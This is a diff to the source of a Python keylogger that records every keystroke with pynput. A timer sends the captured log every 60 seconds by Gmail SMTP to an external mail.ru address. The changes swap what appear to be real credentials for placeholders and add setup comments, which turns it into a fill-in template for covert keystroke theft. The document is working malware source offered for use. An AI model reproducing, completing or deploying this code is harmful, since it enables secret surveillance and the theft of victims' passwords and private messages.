@@ -3,13 +3,15 @@ import threading
 import smtplib
 from email.message import EmailMessage
 import subprocess
+#author : Kimanxo
 
+#importing required modules
 
 log = ""
 
 class Keylogger:
 
-	def press(self, key):
+	def press(self, key): #adjusting options 
 			global log
 			try:
 				log = log + str(key.char)
@@ -43,25 +45,26 @@ class Keylogger:
 				else:
 					log = log + " " + str(key) + " "
 
-	def report(self):
+	def report(self): # report function [ timing ]
 		global log 
 		self.send_mail()
 		log = ""
-		timer = threading.Timer(60, self.report)
+		timer = threading.Timer(60, self.report) #specify the period you want 
 		timer.start()
 
 	def send_mail(self):
-		server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
-		sender = 'saadaouiismailmed@gmail.com'
-		server.login(sender, '##RUHACK313##')
+		server = smtplib.SMTP_SSL('smtp.gmail.com', 465) #gmail SMTP settings
+		sender = 'example@gmail.com' #put your gmail here 
+		server.login(sender, 'yourpassword') #password
 		msg = EmailMessage()
 		msg['From'] = sender
-		msg['To'] = "kimanxo@mail.ru"
+		msg['To'] = "receiver@mail.ru" # receiver email 
 		msg['Subject'] = "LOGS"
 		body = (log)
 		msg.set_content(body)
 		server.send_message(msg)
 		server.quit()
+# ! Make sure you allow python to use the sender's  gmail (you will find it gmail settings )
 
 	def start(self):
 		Listener = pynput.keyboard.Listener(on_press = self.press) 
